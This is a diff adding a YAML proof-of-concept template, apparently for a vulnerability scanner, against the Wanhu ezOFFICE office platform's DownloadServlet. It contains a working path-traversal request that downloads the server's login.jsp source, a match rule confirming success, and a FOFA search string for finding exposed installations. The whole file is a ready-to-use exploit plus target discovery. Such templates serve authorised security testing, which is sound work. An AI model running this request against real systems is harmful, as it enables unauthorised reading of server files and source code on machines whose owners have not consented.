@@ -1,0 +1,15 @@
+id: poc-yaml-wan-hu-ezoffice-downloadservlet-anyfile-download
+info:
+  name: 万户 ezOFFICE DownloadServlet 任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+requests:
+- method: GET
+  path: /defaultroot/DownloadServlet?modeType=2&path=html&FileName=..%5C..%5Clogin.jsp&name=123&fiewviewdownload=2&cd=inline&downloadAll=2
+  expression: status_code == 200 && contains(headers,"application/x-msdownload;charset=GBK")
+    && contains(body,"万户ezOFFICE协同管理平台") && contains(body,"request.getParameter(\"logoindexpicaccName\")")
+variables: {}
+transport: http
